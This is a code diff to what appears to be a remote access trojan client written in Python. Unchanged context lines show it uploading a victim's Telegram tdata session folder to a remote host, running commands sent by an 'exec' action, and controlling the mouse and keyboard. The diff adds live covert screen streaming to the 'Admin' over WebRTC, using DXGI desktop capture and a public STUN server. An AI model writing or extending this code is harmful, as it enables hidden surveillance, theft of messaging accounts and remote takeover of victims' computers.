@@ -23,6 +23,11 @@ except ImportError:
 
 from pynput.mouse import Button, Controller as MouseController
 from pynput.keyboard import Key, Controller as KeyboardController
+import asyncio
+from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, RTCIceCandidate, RTCConfiguration, RTCIceServer
+from aiortc.contrib.media import MediaRelay
+import av
+import dxcam
 
 # --- Imports for Windows Specifics ---
 try:
@@ -69,6 +74,12 @@ if IS_WINDOWS:
             ("hIcon", wintypes.HANDLE),
             ("hProcess", wintypes.HANDLE),
         ]
+    
+    # --- DXCAM Global ---
+    # We initialize this lazily or once
+    dx_camera = None
+
+
 
 HEADER_LENGTH = 10
 
@@ -575,6 +586,122 @@ class Streamer(threading.Thread):
             finally:
                 data_socket.close()
 
+# --- WebRTC Components ---
+class DXGICaptureTrack(VideoStreamTrack):
+    """
+    A Custom VideoStreamTrack that yields frames from DXCAM (DXGI Desktop Duplication).
+    """
+    def __init__(self):
+        super().__init__()
+        global dx_camera
+        if dx_camera is None:
+            # Create the camera instance once. 
+            # Dxcam needs to run on the same thread it was created if we aren't careful, 
+            # but here we just need a global instance.
+            import dxcam
+            dx_camera = dxcam.create(output_color="BGR") 
+        self.camera = dx_camera
+        self.start_time = None
+
+    async def recv(self):
+        pts, time_base = await self.next_timestamp()
+        
+        # Capture frame (non-blocking if possible, but dxcam.grab is blocking-ish)
+        # We run it in executor to avoid blocking the asyncio loop if it waits for VSync
+        loop = asyncio.get_running_loop()
+        
+        # dxcam.grab() returns None on timeout/no-change if configured, or blocks.
+        # simple grab() blocks until a new frame is available.
+        # We wrap it to ensure we don't block the loop.
+        frame = await loop.run_in_executor(None, self.camera.grab)
+        
+        if frame is None:
+            # If nothing, just return a black frame or repeat? 
+            # Creating a dummy frame to keep stream alive
+            frame = np.zeros((1080, 1920, 3), dtype=np.uint8)
+
+        # Convert to av.VideoFrame
+        # Dxcam returns numpy array in BGR (default) or RGB. We requested BGR.
+        # PyAV expects appropriate format.
+        new_frame = av.VideoFrame.from_ndarray(frame, format="bgr24")
+        new_frame.pts = pts
+        new_frame.time_base = time_base
+        return new_frame
+
+# --- WebRTC Manager ---
+webrtc_pc = None
+webrtc_loop = None
+webrtc_thread = None
+
+def run_webrtc_loop(loop):
+    asyncio.set_event_loop(loop)
+    loop.run_forever()
+
+def start_webrtc_thread():
+    global webrtc_loop, webrtc_thread
+    if webrtc_thread is None or not webrtc_thread.is_alive():
+        webrtc_loop = asyncio.new_event_loop()
+        webrtc_thread = threading.Thread(target=run_webrtc_loop, args=(webrtc_loop,), daemon=True)
+        webrtc_thread.start()
+    return webrtc_loop
+
+async def handle_offer(pc, offer_sdp, sock):
+    """
+    Handles an SDP offer from the Admin: sets remote desc, adds track, creates answer.
+    """
+    @pc.on("icecandidate")
+    async def on_icecandidate(candidate):
+        # This callback isn't standard in aiortc (it handles ICE differently), 
+        # but if we needed to trickle, we'd do it here.
+        # Aiortc gathers candidates automatically before signaling 'complete' usually,
+        # but for vanilla ICE we might need to send candidates as they appear if we use trickle.
+        pass
+
+    @pc.on("connectionstatechange")
+    async def on_connectionstatechange():
+        print(f"Connection state is {pc.connectionState}")
+        if pc.connectionState == "failed":
+            await pc.close()
+
+    # Set Remote Description
+    offer = RTCSessionDescription(sdp=offer_sdp, type="offer")
+    await pc.setRemoteDescription(offer)
+
+    # Add Media Track (DXGI)
+    # We only add it if we are answering a "watch" request.
+    # For now, we assume any offer is for watching.
+    track = DXGICaptureTrack()
+    pc.addTrack(track)
+
+    # Create Answer
+    answer = await pc.createAnswer()
+    await pc.setLocalDescription(answer)
+
+    # Send Answer via Signaling Server (TCP)
+    response = {
+        "type": "webrtc_answer",
+        "sdp": pc.localDescription.sdp
+    }
+    # We need to send this back to the main thread's socket
+    # Calling send_json from another thread/loop is risky if not synchronized, 
+    # but send_json uses sock.sendall which is thread-safe in Python (atomic-ish).
+    send_json(sock, response)
+
+async def handle_candidate(pc, candidate_dict):
+    candidate = RTCIceCandidate(
+        component=candidate_dict['component'],
+        foundation=candidate_dict['foundation'],
+        ip=candidate_dict['ip'],
+        port=candidate_dict['port'],
+        priority=candidate_dict['priority'],
+        protocol=candidate_dict['protocol'],
+        type=candidate_dict['type'],
+        sdpMid=candidate_dict['sdpMid'],
+        sdpMLineIndex=candidate_dict['sdpMLineIndex']
+    )
+    await pc.addIceCandidate(candidate)
+
+
 def handle_tdata_upload(host, port, token, main_sock):
     """Finds, archives, and uploads the Telegram tdata folder."""
     try:
@@ -795,6 +922,9 @@ def main():
 
     fs_manager = FileSystemManager(sock)
 
+    # Start WebRTC Event Loop Thread
+    loop = start_webrtc_thread()
+
     while True:
         request = receive_json(sock)
         
@@ -806,7 +936,37 @@ def main():
             continue
 
         action = request.get("action")
+        msg_type = request.get("type")
         payload = request.get("payload", {})
+
+        # --- WebRTC Signaling Handling ---
+        if msg_type == "webrtc_offer":
+            # Admin wants to watch
+            global webrtc_pc
+            # Reset PC
+            if webrtc_pc:
+                asyncio.run_coroutine_threadsafe(webrtc_pc.close(), webrtc_loop)
+            
+            # Configure Stun
+            # We need to create the PC inside the loop to ensure it attaches to that loop
+            async def create_pc_and_handle():
+                global webrtc_pc
+                # Google STUN server configuration
+                config = RTCConfiguration(iceServers=[
+                    RTCIceServer(urls="stun:stun.l.google.com:19302")
+                ])
+                webrtc_pc = RTCPeerConnection(configuration=config)
+                await handle_offer(webrtc_pc, request.get("sdp"), sock)
+            
+            asyncio.run_coroutine_threadsafe(create_pc_and_handle(), webrtc_loop)
+            continue
+
+        elif msg_type == "webrtc_candidate":
+            if webrtc_pc:
+                candidate = request.get("candidate")
+                asyncio.run_coroutine_threadsafe(handle_candidate(webrtc_pc, candidate), webrtc_loop)
+            continue
+        # ---------------------------------
 
         if action == "exec":
             cmd = payload
